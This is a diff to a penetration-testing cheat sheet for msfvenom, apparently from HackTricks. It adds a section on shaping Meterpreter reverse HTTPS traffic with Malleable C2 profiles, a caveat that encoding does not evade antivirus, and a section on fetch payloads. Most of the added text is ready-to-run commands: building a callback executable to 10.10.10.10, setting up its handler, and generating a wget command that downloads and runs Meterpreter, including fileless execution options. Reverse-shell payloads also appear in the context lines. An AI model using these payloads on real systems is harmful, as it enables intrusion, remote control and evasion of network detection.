@@ -31,6 +31,29 @@ PrependSetuid=True #Use this to create a shellcode that will execute something w
 
 The flags shown here select bad characters, output format, encoder, and encoding iterations.<sup>[[1]](#references)</sup>
 
+## HTTP(S) Meterpreter traffic shaping
+
+Metasploit 6.5 added the `MALLEABLEC2` option to staged and stageless reverse HTTP(S) Meterpreter payloads. The profile can change URIs, user agents, request/response headers, connection-ID placement and supported body encodings/wrappers. Both the generated payload and its handler must load the **same local profile**. A staged payload's initial request for the Meterpreter stage is not shaped, so prefer a stageless payload such as `windows/x64/meterpreter_reverse_https` when the first request must also match the profile.<sup>[[3]](#references)</sup>
+
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_https \
+  LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
+  -f exe -o reverse_https.exe
+```
+
+Configure the matching handler with the identical payload and profile:<sup>[[3]](#references)</sup>
+
+```text
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_https
+set LHOST 10.10.10.10
+set LPORT 443
+set MALLEABLEC2 /opt/profiles/web.profile
+run
+```
+
+Only the directives documented as implemented affect traffic; unsupported profile blocks may parse successfully while having no effect.<sup>[[3]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -69,6 +92,8 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
+
+> **Encoding is not AV evasion:** encoders such as `x86/shikata_ga_nai` are primarily useful for satisfying bad-character constraints. Repeated encoding is not a reliable AV-evasion technique.<sup>[[1]](#references)</sup>
 
 ### Embedded inside executable
 
@@ -173,8 +198,37 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
 
+## Fetch payload adapters
+
+Fetch payloads produce a command that makes an available target utility download and execute an underlying native payload. Their names follow `cmd/<platform>/<fetch-protocol>/<served-payload>`; HTTP(S), SMB and TFTP adapters are available, with downloader choices depending on the target platform.<sup>[[2]](#references)</sup>
+
+For example, generate a Linux `wget` command that retrieves an x64 Meterpreter payload from port 8080 and connects it back on port 4444:<sup>[[2]](#references)</sup>
+
+```bash
+msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
+  FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
+  LHOST=10.10.10.10 LPORT=4444 -f raw
+```
+
+Start the **fetch handler** with the same settings; it hosts the generated ELF and also starts the handler for the served Meterpreter payload:<sup>[[2]](#references)</sup>
+
+```text
+use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
+set FETCH_COMMAND WGET
+set FETCH_SRVHOST 10.10.10.10
+set FETCH_SRVPORT 8080
+set LHOST 10.10.10.10
+set LPORT 4444
+to_handler
+```
+
+Useful dependent options include `FETCH_PIPE=true` to emit a shorter HTTP(S) command where supported and `FETCH_FILELESS=shell`, `shell-search`, or `python3.8+` to execute a Linux ELF from an anonymous file descriptor. Fileless modes require Linux kernel 3.17 or later; inspect the exact adapter with `msfvenom -p <FETCH_PAYLOAD> --list-options` because supported combinations vary.<sup>[[2]](#references)</sup>
+
+
+
 ## References
 
 - [1] [How to use msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
-
+- [2] [How to use Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
+- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
 {{#include ../../banners/hacktricks-training.md}}
